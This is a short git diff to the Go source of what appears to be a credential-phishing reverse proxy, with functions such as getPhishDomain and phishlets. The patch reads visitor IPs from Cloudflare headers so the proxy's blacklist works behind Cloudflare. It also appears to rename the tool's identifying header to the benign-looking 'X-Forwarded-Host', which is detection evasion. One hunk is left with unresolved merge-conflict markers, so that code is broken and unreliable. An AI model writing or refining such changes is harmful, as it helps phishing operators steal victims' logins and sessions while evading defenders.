@@ -167,7 +167,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
-			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			from_ip := req.Header.Get("CF-Connecting-IP")
+			if from_ip == "" {
+				from_ip = strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			}
 
 			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
@@ -1788,9 +1791,15 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
+<<<<<<< Updated upstream
 //func (p *HttpProxy) getHomeDir() string {
 //	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 //}
+=======
+func (p *HttpProxy) getHomeDir() string {
+	return "X-Forwarded-Host"
+}
+>>>>>>> Stashed changes
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
